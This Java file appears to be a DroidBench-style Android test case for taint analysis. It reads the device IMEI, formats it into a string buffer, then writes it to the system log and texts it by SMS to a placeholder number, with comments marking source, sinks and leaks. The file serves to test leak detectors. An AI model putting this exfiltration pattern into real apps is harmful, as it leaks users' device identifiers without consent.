package edu.mit.string_formatter;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.util.Formatter;

/**
 * @testcase_name String Format
 * 
 * @description Test String Formatter
 * @dataflow source -> sink
 * @number_of_leaks 1
 * @challenges - Modeling of StringBuffer and StringFormatter
 */
public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
         
        TelephonyManager mgr = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        String imei = mgr.getDeviceId();  //source
        StringBuffer buf = new StringBuffer();
        
        Formatter formatter = new Formatter(buf);
        formatter.format("%s", imei);
        formatter.close();
        
        Log.i("DroidBench", buf.toString()); //sink, leak
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, buf.toString(), null, null); //sink, leak
    }
}
